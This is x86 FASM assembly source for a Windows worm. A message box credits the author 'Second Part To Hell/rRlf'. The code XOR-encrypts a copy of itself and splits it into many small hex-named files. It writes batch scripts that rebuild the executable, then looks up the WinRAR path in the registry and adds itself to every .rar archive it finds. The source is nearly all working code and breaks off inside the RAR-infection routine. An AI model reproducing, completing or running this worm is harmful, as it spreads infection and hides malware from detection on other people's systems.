include '..\FASM\INCLUDE\win32ax.inc'

	primary_decryption_code_length	EQU primary_decryption_code_end-primary_decryption_code
	inf_string_length1		EQU end_inf_str-inf_str

.data
	memory_alloc	dd 0x0
	my_filename	dd 0x0
	hCreFile	dd 0x0
	new_filesize	dd 0x0
	hCrFiMap	dd 0x0
	hMapView	dd 0x0
	hCrypTxt	dd 0x0

	keysize 	dd 0x0

	trash_counter	dd 0x0

	bin2hex:
	bin2hex_1	db 0x0
	bin2hex_2	db 0x0
			db 0x0
	rnd_split_combine_buffer: times 12 db 0x0

	rand_name_buffer: times 8 db 0x0
	rnd_file_name:	  times 9 db 0x0
				  db 'txt',0x0

	new_filename:	  times 8 db 0x0
	    exe_ext:		  db '.exe',0x0

	hex_filename:	  times 8 db 0x0	; 8 Bytes Filename
				  db '.'	; '.'
	hex_extention:		  db '000'	; 3 Bytes Extention
	   zero_field:		  db 0x0	; 0-terminated String

	FALSE_F 	dd 0x0
	dotdot		db '..',0x0

	c_file_size	dd 0x0

	combine_name_size	db 0x0
	combine_name_size2	db 0x0
	combine_name		db 'start.bat', 0x0
	combine_data		dd 0x0
	combine_pointer 	dd 0x0
	combine_start		db 'copy '
	combine_b_space 	db ' '
	combine_b		db '/b'
	combine_space		db ' '
	combine_handle		dd 0x0

	split_handle		dd 0x0
	split_counter		db 0x0

	combine_cd		db 'cd '
	worm_dir:	times 8 db 0x0
	end_combine_cd		db 0x0D,0x0A
	GetCurrentDir_buffer:	times 255 db 0x0
	GetCDB_Size		dd 0x0
	program_dir_reg_subkey	db 'SOFTWARE\Microsoft\Windows\CurrentVersion',0x0
	program_dir_reg_value	db 'ProgramFilesDir',0x0
	reg_handle		dd 0x0
	reg_value_type		dd 0x0
	reg_buffer_size 	dd 0x25
	reg_buffer:  times 0x25 db 0x0			; Program-Dir-Buffer
		     times 21	db 0x0			; WinRAR-String-Buffer
	GCD:	     times 255	db 0x0			; Current-Directory-Buffer

	infection_extention	db '*.rar',0x0
	inf_handle		dd 0x0
	inf_str 		db '\WinRAR\rar.exe a -y '
	inf_string_length	dd 0x0
	end_inf_str:
	save_inf_str_pointer	dd 0x0

WIN32_FIND_DATA:
  .dwFileAttributes   dd ?
  .ftCreationTime     FILETIME
  .ftLastAccessTime   FILETIME
  .ftLastWriteTime    FILETIME
  .nFileSizeHigh      dd ?
  .nFileSizeLow       dd ?
  .dwReserved0	      dd ?
  .dwReserved1	      dd ?
  .cFileName	      rb 260
  .cAlternateFileName rb 14
; end WIN32_FIND_DATA

STARTUPINFO_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0
; end STARTUPINFO

PROCESS_INFORMATION_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0
; end PROCESS_INFORMATION

systemtime_struct:	       ; for random number
	  dw 0		       ; wYear
	  dw 0		       ; wMonth
	  dw 0		       ; wDayOfWeek
	  dw 0		       ; wDay
	  dw 0		       ; wHour
	  dw 0		       ; wMinute
	  dw 0		       ; wSecond
rnd:	  dw 0		       ; wMilliseconds

	; Now the code of dechiff.exe follows:
	include 'prime_decrypt_bin.inc'


.code
 start:
	invoke	GetCommandLine		; Get the name of the running file
	inc	eax

	mov	[my_filename], eax	; Save the filename

   get_my_name:
	inc	eax
	cmp	byte [eax], '.'
   jne	get_my_name
	add	eax, 4
	mov	byte [eax], 0x0

	invoke	MessageBox, 0x0, "Eppur si muove! - Defend your opinion!", "Artwork by Second Part To Hell/rRlf", 0x0

	call	random_name			; Generate a random name
	mov	ecx, 8
	mov	esi, rnd_file_name
	mov	edi, new_filename
	rep	movsb				; Write the random name to 'new_filename'

	invoke	CopyFile, \			; Copy the own file, as access is denied while running
		[my_filename], \
		new_filename, \ 		; random name
		FALSE
	invoke	CreateFile, \			; Get the handle of the file
		new_filename, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCreFile], eax

	invoke	GetFileSize, \			; Get the Filesize of the file
		[hCreFile], \
		new_filesize
	mov	[new_filesize], eax
	mov	[c_file_size], primary_decryption_code_length



	invoke	CreateFileMapping, \		; Create a Map of the File
		[hCreFile], \
		0x0, \
		PAGE_READWRITE, \
		0x0, \
		[new_filesize], \
		0x0
	mov	[hCrFiMap], eax

	invoke	MapViewOfFile, \		; Create a MapViewOfFile
		[hCrFiMap], \
		FILE_MAP_ALL_ACCESS, \
		0x0, \
		0x0, \
		[new_filesize]
	mov	[hMapView], eax

	call	random_name
	mov	byte [rnd_file_name+8], 0x0

	invoke	CreateDirectory, \		; Current directory=Worm directory
		rnd_file_name, \
		0x0

	invoke	SetCurrentDirectory, \
		rnd_file_name

	mov	esi, rnd_file_name
	mov	edi, worm_dir
	mov	ecx, 0x8
	rep	movsb				; Save the name of the worm-directory

	mov	byte [rnd_file_name+8], '.'
	call	random_name
	invoke	CreateFile, \
		rnd_file_name, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0
	mov	[hCrypTxt], eax

	invoke	VirtualAlloc, \
		0x0, \
		0x10000, \		; 64 KB RAM
		0x1000, \
		0x4
	mov	[memory_alloc], eax

	push	0x0				; =pointer=0x0
	call	random_number

   generate_crypt_key:
	pop	eax
	push	eax
	call	random_number			; Generate 8 random numbers in rand_name_buffer
	mov	ecx, [rand_name_buffer+3]	; ecx=random dword
	and	ecx, 7				; ecx=00000000 00000000 00000000 00000???
	inc	ecx				; ecx!=0!
	cmp	ecx, 7				; ecx>8?
	jg	generate_crypt_key		; generate new random!
	mov	esi, rand_name_buffer		; From: rand_name_buffer
	mov	edi, [memory_alloc]		; To: memory
	pop	edx				; Get pointer
	add	edi, edx			; edi=memory_alloc+pointer
	add	edx, ecx			; Add number of written bytes to the counter
	push	edx				; Save pointer
	rep	movsb				; Write!
	call	random_number			; Get another random number

	xor	ebx,ebx
	mov	bx, word [rand_name_buffer+1]	; bx=???? ???? ???? ????
	add	bx, word [rand_name_buffer+3]
	add	bx, word [rand_name_buffer+5]
	cmp	ebx, 0x80
   jg  generate_crypt_key			; If not: Continue generating keys

	pop	eax				; Get KEY-size
	mov	[keysize], eax

	invoke	WriteFile, \			; Write the generated random code to the .txt file
		[hCrypTxt], \
		[memory_alloc], \
		[keysize], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \			; Close the .txt file
		[hCrypTxt]

	mov	ecx, [new_filesize]
   encrypt_map:
	mov	edx, [new_filesize]		; EDX=filesize
	sub	edx, ecx			; EDX=filesize-ECX(bytes to write)
	mov	eax, [memory_alloc]		; EAX=pointer to random code in memory
	add	eax, edx			; EAX=pointer to current rnd byte in memory
	mov	al, byte [eax]			; Cryptor-Byte in AL
	mov	ebx, [hMapView] 		; EBX=Pointer to MapView
	add	ebx, edx			; EBX=Pointer to current byte of MapView
	mov	ah, byte [ebx]			; Byte to be encrypted in AH
	xor	ah, al				; Encrypt!
	mov	ebx, [hMapView] 		; Pointer of Mapped File to ebx
	add	ebx, edx			; Get the -to-encrypt- byte
	mov	[ebx], ah			; Move the encrypted Byte to Memory
   loop encrypt_map


	xor	ecx, ecx			; ECX=counter=0
   write_hex_to_memory:
	add	ecx, [hMapView]
	mov	al, byte [ecx]			; One Byte of Mapview to al
	sub	ecx, [hMapView]
	call	binary_to_hex			; Convert binary al to hex valie (AX)
	mov	ebx, ecx			; EBX=counter
	shl	ebx, 1				; EBX*=2
	add	ebx, [memory_alloc]
	mov	word [ebx], ax			; Write HEX-Value
	inc	ecx				; Increase the counter
	cmp	ecx, [new_filesize]		; ECX=filesize?
   jne	write_hex_to_memory			; If yes, stop writing



	mov	ecx, [new_filesize]		; ecx=filesize
	shl	ecx, 1				; ecx*=2 = Size of byte to write (the HEX-values)
	mov	[trash_counter], ecx		; trash_counter=counter
   generate_hex_files:
	mov	eax, [trash_counter]		; If trash_counter < 0x8  -> AL=trash_counter
	cmp	[trash_counter], 0x8		; Compare if trash_counter <=8
	jle	make_last_hex_file		; If so, goto end of writing
	call	random_name
	call	random_byte			; al=random number
	xor	al, byte [rand_name_buffer]
	xor	al, byte [rand_name_buffer+2]
	xor	al, byte [rand_name_buffer+4]
	xor	al, byte [trash_counter]
	and	eax, 0x7			; al=0000 0???
	inc	al				; At least 0x1
	mov	ebx, [new_filesize]		; EBX=Filesize
	shl	ebx, 1				; EBX=Bytes to write
	sub	ebx, [trash_counter]		; EBX=Already written bytes
	sub	[trash_counter], eax		; Decrease the bytes to write by the bytes which will be written
						; Dumb Info: The last 2 lines costed me ~1.5h of bug-searching :))
	add	ebx, [memory_alloc]		; EBX=Pointer where to start to write
	call	Create_Hex_File 		; Create the file now
   jmp	generate_hex_files

make_last_hex_file:
	mov	ebx, [new_filesize]
	shl	ebx, 1
	sub	ebx, [trash_counter]
	add	ebx, [memory_alloc]
	call	Create_Hex_File 		; Now all files have been written

	invoke	UnmapViewOfFile, \
		[hMapView]

	invoke	CloseHandle, \
		[hCrFiMap]

	invoke	CloseHandle, \			; Close File
		[hCreFile]

	mov	ecx, primary_decryption_code_length
	mov	esi, primary_decryption_code
	mov	edi, [memory_alloc]
	rep	movsb

	mov	eax, rnd_file_name		; RND-pointer in eax
	add	eax, 8				; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.tmp'		; instate of '.tmp', '.exe'

	invoke	VirtualAlloc, \ 		; Reserve Space in Memory
		0x0, \
		0x120000, \
		0x1000, \
		0x4

	mov	[combine_data], eax				; Save the pointer to it.
	mov	[combine_pointer], eax				; Save again

	invoke	SetCurrentDirectory, \				; Create the start.bat outside of the directory
		dotdot

	invoke	CreateFile, \					; Create start.bat file
		combine_name, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_NEW, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	mov	[combine_handle], eax

	mov	esi, combine_cd
	mov	edi, [combine_pointer]
	mov	ecx, 13
	rep	movsb					; Write 'cd randfolder'\n

	add	[combine_pointer], 13

	mov	byte [end_combine_cd], 0x0

	invoke	SetCurrentDirectory, \
		worm_dir

	mov	ebp, 0xABA9AB
	call	random_name

	mov	esi, combine_start				; What to write
	mov	edi, [combine_pointer]				; Where to write
	mov	ecx, 5						; How much to write
	rep	movsb						; Write!

	add	[combine_pointer], 5				; Get next empty byte to write

    OFS_main_loop:

	call	random_number
	mov	al, [combine_name_size]
	xor	al, byte [rand_name_buffer]
	add	al, byte [rand_name_buffer+5]
	sub	al, byte [rand_name_buffer+2]
	xor	al, byte [rand_name_buffer+4]
	xor	al, byte [rand_name_buffer+1]
	xor	al, byte [rand_name_buffer+3]
	and	al, 0x07					; AL < 7
	mov	[combine_name_size], al

	mov	ebp, 0xAAAAAAAA 				; Influences the random engine
	call	random_name					; random name in rnd_file_name

	xor	eax, eax					; EAX=0
	add	al, [combine_name_size] 			; EAX=(0..7)
	add	eax, rnd_file_name				; EAX=rnd_file_name+(0..7)

	invoke	CreateFile, \
		eax, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_NEW, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	cmp	eax, INVALID_HANDLE_VALUE			; If file already existed
	je	OFS_main_loop					; then get a new file-name


	mov	[split_handle], eax			; Save the file-handle

	call	random_number				; Get random number
	xor	eax, eax				; eax=0
	mov	al, [rand_name_buffer]			; al~=random
	and	al, 7					; al= 0000 0???
	add	al, 3					; At least three byte
	mov	[split_counter], al			; Save that bytes

	sub	[c_file_size], eax			; Decrease the bytes to write

	invoke	WriteFile, \				; Write (1..8) byte
		[split_handle], \
		[memory_alloc], \
		eax, \
		FALSE_F, \
		0x0

	invoke	CloseHandle, [split_handle]		; Close the file

	xor	eax, eax
	mov	al, [split_counter]			; How many bytes written
	add	[memory_alloc], eax			; Add the pointer - write the next few bytes next time


	mov	esi, rnd_file_name			; From: Filename-buffer
	xor	eax, eax
	add	al, [combine_name_size] 		; EAX=(0..7)
	add	esi, eax				; ESI=Pointer to rnd-name+(0..7)
	mov	edi, [combine_pointer]			; To: compainer-pointer
	mov	ecx, 12 				; 8+strlen('.xxx')
	sub	ecx, eax				; ECX=(0..7)+strlen('.xxx')
	rep	movsb					; Write!

	add	[combine_pointer], 12			; Add 12 to pointer
	sub	[combine_pointer], eax			; Subtract (0..7)

	mov	eax, [combine_pointer]			; Pointer to eax

	mov	byte [eax], '+' 			; Move '+' to the code's memory
	inc	[combine_pointer]			; Increase the pointer

	xor	ebx, ebx
	mov	bx, word [rand_name_buffer+1]		; bx=???? ???? ???? ????
	xor	bx, word [rand_name_buffer+3]
	add	bx, word [rand_name_buffer+5]
	add	bx, word [rand_name_buffer+3]
	cmp	ebx, 0x2FFF
	jg	OFS_cmp_end

	call	combine_next_line			; New line in combine-file

   OFS_cmp_end:

	cmp	[c_file_size], 0x0			; Compare if more bytes to write
    jg	OFS_main_loop					; If yes, jmp to main_loop

	mov	eax, [combine_pointer]		; eax=pointer
	dec	eax				; Delete the last '+'
	mov	byte [eax], 0x20		; Add a space



	mov	esi, combine_b					; What to write
	mov	edi, [combine_pointer]				; Where to write
	mov	ecx, 3						; How much to write
	rep	movsb						; Write!

	add	[combine_pointer], 4				; Get next empty byte to write

	mov	ebp, 0xAAAAAAAA 		; Influences the random engine
	call	random_number			; random name in rnd_file_name

	mov	eax, rnd_file_name		; RND-pointer in eax
	add	eax, 8				; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.exe'		; instate of '.tmp', '.exe'

	dec	[combine_pointer]
	mov	esi, rnd_file_name		; From: rnd_file_name
	mov	edi, [combine_pointer]		; To: compainter_pointer
	mov	ecx, 12 			; How much: 12 bytes
	rep	movsb				; Write

	add	[combine_pointer], 12		; Add 12, to get the end again

	mov	eax, [combine_pointer]		; eax=pointer to content
	mov	word [eax], 0x0A0D		; Next Line
	add	[combine_pointer], 2

	mov	esi, rnd_file_name		; From: rnd_file_name
	mov	edi, [combine_pointer]		; To: compainter_pointer
	mov	ecx, 12 			; How much: 12 bytes
	rep	movsb				; Write

	add	[combine_pointer], 12		; Add 12, to get the end again

	mov	eax, [combine_data]
	sub	[combine_pointer], eax

	invoke	WriteFile, \			; Write the last .bat file
		[combine_handle], \
		[combine_data], \
		[combine_pointer], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, \			; Close the last .bat file
		[combine_handle]

	invoke	SetCurrentDirectory, \		; Out of the worm-directory
		dotdot

	invoke	DeleteFile, \			; Delete the temporariely copy of the worm file
		new_filename

	invoke	RegOpenKeyEx, \ 		; Open the reg-key for getting the ProgramDir-Path
		HKEY_LOCAL_MACHINE, \
		program_dir_reg_subkey, \
		0x0, \
		KEY_ALL_ACCESS, \
		reg_handle

	invoke	RegQueryValueEx, \		; Read the info
		[reg_handle], \
		program_dir_reg_value, \
		0x0, \
		reg_value_type, \
		reg_buffer, \
		reg_buffer_size

	invoke	RegCloseKey, \					; Close reg-key
		[reg_handle]

	xor	ecx, ecx
    find_end_zero_loop: 					; Find the end of the value-string
	mov	eax, reg_buffer
	add	eax, ecx
	inc	ecx
	cmp	byte [eax], 0x0 				; If zero=END
    jne find_end_zero_loop

	sub	eax, reg_buffer

	mov	esi, inf_str
	mov	edi, reg_buffer
	add	edi, eax
	mov	ecx, inf_string_length1
	rep	movsb						; Append the WinRAR-string to the %ProgramFilesDir%

	add	eax, inf_string_length1
	dec	eax
	mov	[inf_string_length], eax

	invoke	GetCurrentDirectory, \
		0x100, \
		GetCurrentDir_buffer

	xor	ecx, ecx
    find_GCD_zero_loop: 					; Find the end of the Current-Dir-string
	mov	eax, GetCurrentDir_buffer
	add	eax, ecx
	inc	ecx
	cmp	byte [eax], 0x0 				; If zero=END
    jne find_GCD_zero_loop

	sub	eax, GetCurrentDir_buffer
	mov	[GetCDB_Size], eax

	mov	esi, GetCurrentDir_buffer
	mov	edi, GCD
	mov	ecx, [GetCDB_Size]
	rep	movsb						; Write a temp GetCurDir-String

	call	Find_RAR_Files_And_Infect			; Call the Infection Functions

	invoke	SetCurrentDirectory, \				; The worm-file is generated in the worm-directory
		dotdot						; (hardly any .RARs)so we should go out, infect other dirs

	call	ChangeDirString 				; Change the path of the current directory

	call	Find_RAR_Files_And_Infect			; And infect!

	invoke	ExitProcess, 0x0

Create_Hex_File:
; Generate a file with code (converted to HEX) in the filename
; In:  al  = Bytes of filename (without extention)
;      ebx = Pointer of filename-content
;
; Anything changed!

	mov	dword [hex_filename+0], 0x0
	mov	dword [hex_filename+4], 0x0

	xor	ecx, ecx		; ECX=0
	mov	cl, al			; ECX=bytes of filename
	mov	esi, ebx		; ESI=Source=Pointer filename-content
	mov	al, 0x8 		; Maximal filesize
	sub	al, cl			; MAX-REAL=DIF
	and	eax, 0xFF		; eax= 0000 00FF
	mov	edi, hex_filename	; EDI=Destination=Buffer for filename
	add	edi, eax		; Real place to write
	rep	movsb			; Write

	add	eax, hex_filename

	invoke	CreateFile, \
		eax, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_ALWAYS, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	invoke	CloseHandle, \
		eax

	mov	eax, hex_extention+2	; Pointer to 3rd byte in extention
	cmp	byte [eax], '9' 	; Is it '9'?
	je	hex_ext_counter_9_A	; If yes, make a 'A'

	cmp	byte [eax], 'Z' 	; Is it 'Z'?
	je	hex_ext_counter_Z_0

	inc	byte [eax]		; Increase extention-counter
ret

hex_ext_counter_9_A:
; In:  eax = Pointer to byte to change
; Out: [eax]='A'

	mov	byte [eax], 'A' 	; Increase extention-counter
ret


hex_ext_counter_Z_0:			; My first recursive function in asm :)
	mov	byte [eax], '0' 	; Increase extention-counter
	dec	eax
	cmp	byte [eax], '9'
	je	hex_ext_counter_9_A

	cmp	byte [eax], 'Z'
	je	hex_ext_counter_Z_0

	inc	byte [eax]
ret


binary_to_hex:
; Convert a binary byte to a hex-number
; In:  al = binary byte
; Out: ax = hex-value
; Nothing else changed

	mov	word [bin2hex], 0x3030		; Code of "00"
	mov	ah, al				; ah=al
	and	al, 0x0F			; al=0000 ????

	push	binary_to_hex_RJ_1		; Offset of return jmp to stack

	cmp	al, 0x0A			; Is al > 10
	jge	bin2hex_inc_al			; If yes, increase AL:
						; ASCII '0' = 0x30
						; ASCII '9' = 0x39
						; ASCII 'A' = 0x41
						; 'A'-'9' = 0x41-0x39 = 8-1 = 7

	mov	[trash_counter], ebx		 ; We did not need the retrun value
	pop	ebx				 ; Get it back
	mov	ebx, [trash_counter]		 ; Restore ebx

   binary_to_hex_RJ_1:
	add	byte [bin2hex_2], al		; '0'+al

	shr	ah, 4				; ah = ???? ---- -> 0000 ????
	mov	al, ah				; al = ah

	push	binary_to_hex_RJ_2

	cmp	al, 0x0A
	jge	bin2hex_inc_al

	mov	[trash_counter], ebx
	pop	ebx
	mov	ebx, [trash_counter]
   binary_to_hex_RJ_2:
	add	byte [bin2hex_1], al

	mov	ax, word [bin2hex]		; HEX-value to ax
ret


bin2hex_inc_al:
	add	al, 7				; al += 7  <- If al > "9" then ASCII-number + 7
ret



random_number:
	pop	edi				; Get value of stack
	push	edi				; Back to the stack
	mov	ecx, 8				; ecx=counter
	mov	dh, 0xAA			; dh: changes in the function and makes the number little bit more random
	mov	dl, 0x87			; same as dh
   random_name_loop:
	push	dx				; Save dx at stack
	push	ecx				; Save counter at stack
	call	random_byte			; Random number in al
	pop	ecx				; get counter
	xor	al, cl				; Counter influences pseudo random number
	pop	dx				; Get dx
	push	ecx
	xor	dx, cx				; Counter influences influncing number
	add	dh, al				; Random number influences influencing number
	sub	dl, al				; Same as dh
	neg	dl				; Neg dl
	xor	dl, dh				; dl XOR dh -> more variability
	xor	al, dl				; random number changes
	sub	ax, di				; value of stack influences random number
	add	ax, dx				; ax+dx
	mov	dl, [rand_name_buffer+ecx-2]
	mov	dh, byte [rand_name_buffer+ecx-3]    ; dx=???? ???? ????? ?????
	sub	al, dl				; al-=dl
	add	al, dh				; al+=dh
	mov	ah, dl				; ah=dl
	push	ax				; AX to stack
	mov	cl, 1				; cl=1
	or	dh, cl				; dh is at least 1 (to reduce chance of result=zero)
	mul	dh				; AL=AX*DH
	pop	cx				; CX=old AX
	push	cx				; To stack again
	add	cl, al				; CL+=AL
	sub	cl, ah				; CL-=AH
	xchg	al, cl				; AL=CL
	mov	cx, bp				; cx=bp
	mul	cl				; AX=AL*CL
	neg	ah				; NEG AH
	xor	al, ah				; xor AL and AH
	pop	cx				; get old AX
	sub	cl, al				; SUB
	add	cl, dl				; cl+=old random number
	sub	al, cl				; al ~=random :)
	pop	ecx				; Get counter
	mov	byte [rand_name_buffer+ecx-1], al    ; Save random letter
   loop random_name_loop
ret



random_name:
	call	random_number			; Get 8 random bytes
	mov	ecx, 8				; counter=8, as we want to do it 8 times

   changetoletter:
	mov	al, byte [rand_name_buffer+ecx-1]    ; Get a letter
	mov	bl, 10				; BL=10
	xor	ah, ah				; AX: 0000 0000 ???? ????
	div	bl				; AL=rnd/10=number between 0 and 25
	add	al, 97				; Add 97 for getting lowercase letters
	mov	[rnd_file_name+ecx-1], al	; Save random letter
   loop changetoletter
ret

random_byte:
	invoke	GetSystemTime, systemtime_struct	; Get first number
	mov	ebx, [rnd-2]				; ebx=number
	add	ebx, edx				; Making it pseudo-independent of time
	sub	ebx, ecx
	xor	ebx, eax
	xchg	bl, bh
	pop	ecx
	push	ecx
	neg	ebx
	xor	ebx, ecx				; ebx=pseudo-indepentend number

	invoke	GetTickCount				; Get second number
	xor	eax, ecx				; eax=number
	neg	ax					; Making it pseudo-independent of time
	xor	eax, edx
	xor	ah, al
	sub	eax, ebp
	add	eax, esi				; eax=pseudo-indepentend number

	xor	eax, ebx				; Compain the numbers -> eax
	mov	ebx, eax				; Save eax
	shr	eax, 8					; e-part -> ax
	xor	ax, bx
	xor	al, ah					; al=number
ret

combine_next_line:
	mov	eax, [combine_pointer]				; eax=pointer
	dec	eax						; Delete the last '+'
	mov	byte [eax], 0x20				; Add a space
	inc	[combine_pointer]				; Increase pointer again

	mov	ebp, 0xAAAAAAAA 				; Influences the random engine
	call	random_name					; random name in rnd_file_name

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.exe'				; instate of '.tmp', '.exe'

	dec	[combine_pointer]

	mov	esi, combine_b					; copy [source] /b [destination]
	mov	edi, [combine_pointer]
	mov	ecx, 3
	rep	movsb

	add	[combine_pointer], 3

	mov	esi, rnd_file_name				; From: rnd_file_name
	xor	eax, eax
	mov	al, [combine_name_size]
	add	esi, eax					; ESI=Pointer to RND-Name+(0..7)
	mov	edi, [combine_pointer]				; To: compainter_pointer
	mov	ecx, 12
	sub	ecx, eax
	rep	movsb						; Write

	add	[combine_pointer], 12				; Add 12, to get the end again
	xor	eax, eax
	mov	al, [combine_name_size]
	sub	[combine_pointer], eax

	mov	eax, [combine_pointer]				; eax=pointer to content
	mov	word [eax], 0x0A0D				; Next Line
	add	[combine_pointer], 2

	call	random_number
	and	byte [rand_name_buffer+4], 0x03 		; rand_name_buffer+4 < 4
	cmp	byte [rand_name_buffer+4], 0x00 		; rand_name_buffer+4 = 0 ?
	je	combine_file_split				; If yes, close current combine file,
								; make a new one,
								; call it and continue

	mov	esi, combine_start				; What to write
	mov	edi, [combine_pointer]				; Where to write
	mov	ecx, 5						; How much to write
	rep	movsb						; Write!

	add	[combine_pointer], 5				; Get next empty byte to write

	mov	esi, rnd_file_name				; From: rnd_file_name
	xor	eax, eax
	mov	al, [combine_name_size]
	add	esi, eax
	mov	edi, [combine_pointer]				; To: compainter_pointer
	mov	ecx, 12 					; How much: 12 bytes
	sub	ecx, eax
	rep	movsb

	add	[combine_pointer], 12
	sub	[combine_pointer], eax

	mov	eax, [combine_pointer]
	mov	byte [eax], '+'
	inc	[combine_pointer]

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.tmp'				; instate of '.tmp', '.exe'
ret


combine_file_split:
	mov	esi, rnd_file_name
	mov	edi, rnd_split_combine_buffer
	mov	ecx, 12
	rep	movsb						; Save last filename

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.bat'				; instate of '.bat', '.exe'


   CFS_loop:
	call	random_number
	mov	al, [combine_name_size]
	xor	al, byte [rand_name_buffer]
	add	al, byte [rand_name_buffer+5]
	sub	al, byte [rand_name_buffer+2]
	xor	al, byte [rand_name_buffer+4]
	xor	al, byte [rand_name_buffer+1]
	xor	al, byte [rand_name_buffer+3]
	and	al, 0x07					; AL < 7
	mov	[combine_name_size2], al

	call	random_name

	xor	eax, eax					; EAX=0
	add	al, [combine_name_size2]			; EAX=(0..7)
	add	eax, rnd_file_name				; EAX=rnd_file_name+(0..7)

	invoke	CreateFile, \					; Create the new .bat file
		eax, \
		GENERIC_READ or GENERIC_WRITE, \
		0x0, \
		0x0, \
		CREATE_NEW, \
		FILE_ATTRIBUTE_NORMAL, \
		0x0

	cmp	eax, INVALID_HANDLE_VALUE			; If file already existed
	je	CFS_loop

	push	eax						; Save the new file handle

	mov	esi, rnd_file_name
	xor	ebx, ebx
	mov	bl, [combine_name_size2]
	add	esi, ebx
	mov	edi, [combine_pointer]
	mov	ecx, 12
	sub	ecx, ebx
	rep	movsb						; Write the name of the new .bat file

	add	[combine_pointer], 12
	sub	[combine_pointer], ebx

	mov	eax, [combine_data]
	sub	[combine_pointer], eax

	invoke	WriteFile, \					; Write the file
		[combine_handle], \
		[combine_data], \
		[combine_pointer], \
		FALSE_F, \
		0x0

	invoke	CloseHandle, [combine_handle]			; Close the old .bat file

		; Now let's prepare anything for the new file

	pop	[combine_handle]				; Get the handle of the new .bat file again

	mov	eax, [combine_pointer]

	mov	eax, [combine_data]
	mov	[combine_pointer], eax				; [combine_pointer] = Start of virtual Alloc

	mov	esi, combine_start
	mov	edi, [combine_pointer]
	mov	ecx, 5
	rep	movsb						; Write 'copy '

	add	[combine_pointer], 5

	mov	esi, rnd_split_combine_buffer
	xor	eax, eax
	mov	al, [combine_name_size]
	add	esi, eax
	mov	edi, [combine_pointer]
	mov	ecx, 12
	add	ecx, eax
	rep	movsb						; Write previous filename

	add	[combine_pointer], 12
	sub	[combine_pointer], eax

	mov	eax, [combine_pointer]
	mov	byte [eax], '+'
	inc	[combine_pointer]

	mov	eax, rnd_file_name				; RND-pointer in eax
	add	eax, 8						; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.tmp'				; instate of '.tmp', '.bat'
ret

Find_RAR_Files_And_Infect:
	invoke	FindFirstFile, \		; Find the first .RAR file
		infection_extention, \
		WIN32_FIND_DATA

	cmp	eax, INVALID_HANDLE_VALUE	; Last File?
	je	End_Find_RARs			; If yes, stop program

	mov	[inf_handle], eax		; Save the search-handle for *.RAR files

	invoke	SetCurrentDirectory, \
		GCD


   find_rar_loop:
	call	Infect_RAR			; INFECT IT!

	invoke	FindNextFile, \ 		; Get next .RAR file
		[inf_handle], \
		WIN32_FIND_DATA

	cmp	eax, 0x0			; Last File?
	je	End_Find_RARs			; If yes, stop program

   jmp	find_rar_loop
   End_Find_RARs:

	invoke	FindClose, \			; Close the search-handle for *.RAR files
		[inf_handle]

ret


Infect_RAR:
	mov	eax, [combine_data]
	mov	[combine_pointer], eax

	mov	esi, reg_buffer
	mov	edi, [combine_pointer]
	mov	ecx, [inf_string_length]
	rep	movsb						; Write the infection string to the memory

	mov	eax, [inf_string_length]
	sub	eax, 3
	add	[combine_pointer], eax


	mov	esi, GetCurrentDir_buffer
	mov	edi, [combine_pointer]
	mov	ecx, [GetCDB_Size]
	rep	movsb						; Write the path of the victim file before the filename

	mov	eax, [GetCDB_Size]
	add	[combine_pointer], eax

	mov	eax, [combine_pointer]

	mov	byte [eax], '\'
	inc	[combine_pointer]
	xor	ecx, ecx
    find_zero_loop:						; Find the end of the name-string
	mov	eax, WIN32_FIND_DATA.cFileName
	add	eax, ecx
	inc	ecx
	cmp	byte [eax], 0x0 				; If zero=END
    jne find_zero_loop

	sub	eax, WIN32_FIND_DATA.cFileName			; EAX=str_len(filename)

	push	eax

	mov	esi, WIN32_FIND_DATA.cFileName
	mov	edi, [combine_pointer]
	mov	ecx, eax
	rep	movsb						; Write the RAR-filename to the string

	pop	ecx
	add	[combine_pointer], ecx

	mov	eax, [combine_pointer]
	mov	byte [eax], 0x20				; Write a space to the pointer

	inc	[combine_pointer]

	mov	eax, WIN32_FIND_DATA.cFileName
    zero_filename_buffer:
	mov	byte [eax], 0x0
	inc	eax
	cmp	eax, 260
    jle zero_filename_buffer

	mov	eax, [combine_pointer]
	mov	[save_inf_str_pointer], eax			; Save the pointer, for the next string
	mov	[combine_pointer], eax


